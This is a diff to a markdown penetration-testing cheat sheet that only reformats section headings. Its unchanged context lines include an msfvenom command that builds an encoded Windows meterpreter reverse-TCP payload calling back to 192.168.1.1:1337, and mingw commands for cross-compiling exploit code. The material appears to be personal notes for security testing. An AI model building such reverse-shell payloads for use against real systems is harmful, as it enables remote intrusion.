@@ -1,6 +1,6 @@
 # Using and Transfering Vulnerabilities
 
-## MSVenom
+## === MSVenom ===
 
 ### [MSFVenom Cheatsheet](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)
 (Below are some of my most used examples)
@@ -25,7 +25,7 @@ run
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1337 -e x86/shikata_ga_nai -f exe -o exploit.exe
 ```
 
-## Compiling Exploits
+## === Compiling Exploits ===
 
 ### C Code
 ```bash
@@ -42,7 +42,7 @@ sudo apt-get install mingw-64
 i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
 ```
 
-## Transfering Vulnerabilities
+## === Transfering Vulnerabilities ===
 
 ### Simple HTTP Server
 (Very useful, suggest making an alias for it!)
